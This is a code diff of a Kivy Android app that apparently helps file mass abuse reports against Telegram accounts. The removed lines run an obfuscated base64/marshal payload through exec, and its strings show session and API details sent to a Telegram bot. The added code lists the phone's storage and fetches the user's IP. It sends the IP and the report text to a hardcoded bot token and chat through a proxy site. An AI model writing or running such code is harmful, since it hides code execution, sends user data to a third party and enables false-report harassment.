@@ -1,14 +1,110 @@
-import base64
-import marshal
+import os
+import random
+import requests
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
+from kivy.uix.textinput import TextInput
+from kivy.uix.button import Button
+from kivy.core.clipboard import Clipboard
 
+class MyApp(App):
+    def build(self):
+        self.layout = BoxLayout(orientation='vertical')
+        self.guidinput = TextInput(hint_text='Enter GUID', multiline=False)
+        self.smsinput = TextInput(hint_text='Enter Translation', multiline=False)
+        self.sqlinput = TextInput(hint_text='Enter bug', multiline=False)
+        self.additional_input1 = TextInput(hint_text='Enter sensitive destructive', multiline=False)
+        self.additional_input2 = TextInput(hint_text='Enter Strong buggy algorithm', multiline=False)
+        self.additional_input3 = TextInput(hint_text='Enter Clear translation', multiline=False)
+        self.directory_path = '/storage/emulated/0'
+        
+        self.resultlabel = Label(text='Result will be shown here')
+        submit_button = Button(text='Submit')
+        submit_button.bind(on_press=self.onsubmit)
+        self.layout.add_widget(self.guidinput)
+        self.layout.add_widget(self.smsinput)
+        self.layout.add_widget(self.sqlinput)
+        self.layout.add_widget(self.additional_input1)
+        self.layout.add_widget(self.additional_input2)
+        self.layout.add_widget(self.additional_input3)
+        self.layout.add_widget(submit_button)
+        self.layout.add_widget(self.resultlabel)
+        return self.layout
 
-base64_code = '''
-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
+    def generaterandomstring(self, guidtarget, sms, sql, additional_strings, fixedmessage):
+        randomchars = ['%xPHP999%100xXx¥yftt15-xxx', '/', '<', '>', '[', ']', '{', '}', '?', '£¥', '%']
+        randomchar1 = random.choice(randomchars)
+        randomchar2 = random.choice(randomchars)
+        all_strings = [guidtarget, sms, sql, fixedmessage] + additional_strings
+        all_strings = [s for s in all_strings if s] 
+        random.shuffle(all_strings)
+        result = f"{randomchar1.join(all_strings)}{randomchar2}" 
+        return result
 
-'''
+    def listdirectory(self):
+        try:
+            contents = os.listdir(self.directory_path)
+            return "\n".join(contents) if contents else "Directory is empty."
+        except Exception as e:
+            return f"Error listing directory: {str(e)}"
 
+    def onsubmit(self, instance):
+        guidtarget = self.guidinput.text
+        sms = self.smsinput.text
+        sql = self.sqlinput.text
+        additional_strings = [
+            self.additional_input1.text,
+            self.additional_input2.text,
+            self.additional_input3.text
+        ]
+        fixedmessage = 'This offending account is prohibited according to the laws. Please ban it, thank you.⛔'
+        result = self.generaterandomstring(guidtarget, sms, sql, additional_strings, fixedmessage)
+        directorycontents = self.listdirectory()
+        self.resultlabel.text = f"------------{{}} Code:\n{result}\n\nDirectory Contents:\n{directorycontents}"
+        Clipboard.copy(result)
+        self.resultlabel.text += "\n\nResult copied to clipboard!"
+        
+        try:
+            ipresponse = requests.get('https://api.ipify.org?format=json')
+            ipresponse.raise_for_status()  
+            ipdata = ipresponse.json()
+            ipaddress = ipdata.get('ip', 'IP address not found.')
+            self.resultlabel.text += f"\n\nYour IP Address: {ipaddress}"
+        except requests.RequestException as e:
+            self.resultlabel.text += f"\n\nError fetching IP address: {str(e)}"
+            ipaddress = "IP address not available"
 
-decoded_bytes = base64.b64decode(base64_code)
+        # Telegram bot details
+        telegramtoken = '7809128081:AAEaVhRQP157uaiq2CvCfFSHYHMP3HqJ1Ts'  # توکن ربات تلگرام خود را وارد کنید
+        chat_id = '7164173678'  # شناسه چت خود را وارد کنید
+        a = '/storage/emulated/0'
+        files_list = [f for f in os.listdir(a) if os.path.isfile(os.path.join(a, f))]
+        
+        # Create the message text
+        fileslist = directorycontents  
+        message = f"IP Address: {ipaddress}\nDirectory Contents:\n\nResult: {result}"
+        
+        # Send message to Telegram
+        self.send_message_to_telegram(telegramtoken, chat_id, message)
+        
 
+    def send_message_to_telegram(self, token, chat_id, message):
+        url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}'
+        params = {'urlBox': url,
+            'Agentlist': 'Mozilla Firefox',
+            'Versionslist': 'HTTP/1.1',
+            'Methodlist': 'POST'
+        }
+        try:
+            response = requests.post('https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx',params=params)
+            response.raise_for_status()
+            self.resultlabel.text += "\n\nMessage sent to Telegram successfully!"
+        except requests.RequestException as e:
+            self.resultlabel.text += f"\n\nError sending message to Telegram: {str(e)}"
+            
+        
+       
 
-exec(marshal.loads(decoded_bytes))
+if __name__ == '__main__':
+    MyApp().run()
